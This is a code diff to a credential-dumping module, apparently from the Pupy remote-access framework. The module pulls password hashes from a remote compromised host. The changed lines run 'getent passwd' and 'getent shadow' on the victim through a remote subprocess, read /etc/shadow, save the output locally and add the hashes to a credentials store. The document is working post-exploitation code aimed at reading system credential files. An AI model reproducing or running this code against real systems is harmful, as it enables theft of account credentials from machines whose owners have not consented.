@@ -39,16 +39,13 @@ __class_name__="CredDump"
 class CredDump(PupyModule):
     """ download the hives from a remote windows system and dump creds """
 
-    dependencies = {
-        'linux': [ 'pupyutils.safepopen' ]
-    }
-
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog='hive', description=self.__doc__)
 
     def run(self, args):
-        self.rep = os.path.join("data", "downloads", self.client.short_name(), "creds")
+        config = self.client.pupsrv.config or PupyConfig()
         self.db = Credentials(client=self.client.short_name(), config=self.config)
+        self.rep = os.path.join(config.get_folder('creds'), self.client.short_name())
 
         try:
             os.makedirs(self.rep)
@@ -120,22 +117,28 @@ class CredDump(PupyModule):
         except Exception as e:
             self.error('/etc/shadow is not accessible: {}'.format(e))
 
-        sopen = self.client.conn.modules['pupyutils.safepopen'].SafePopen
+        rsubprocess = self.client.conn.modules.subprocess
 
         try:
             with open(os.path.join(self.rep, 'getent.passwd'), 'w') as passwd:
-                for line in sopen(['getent', 'passwd']).execute():
-                    if line:
-                        add_hashes(line)
+                for line in rsubprocess.check_output('getent passwd', shell=True).split('\n'):
+                    if not line:
+                        continue
+
+                    add_hashes(line)
+                    passwd.write(line+'\n')
 
         except Exception as e:
             self.error('getent passwd failed: {}: {}'.format(type(e), e.message))
 
         try:
             with open(os.path.join(self.rep, 'getent.shadow'), 'w') as shadow:
-                for line in sopen(['getent', 'shadow']).execute():
-                    if line:
-                        add_hashes(line)
+                for line in rsubprocess.check_output('getent shadow', shell=True).split('\n'):
+                    if not line:
+                        continue
+
+                    add_hashes(line)
+                    shadow.write(line+'\n')
 
         except Exception as e:
             self.error('getent shadow failed: {}: {}'.format(type(e), e.message))
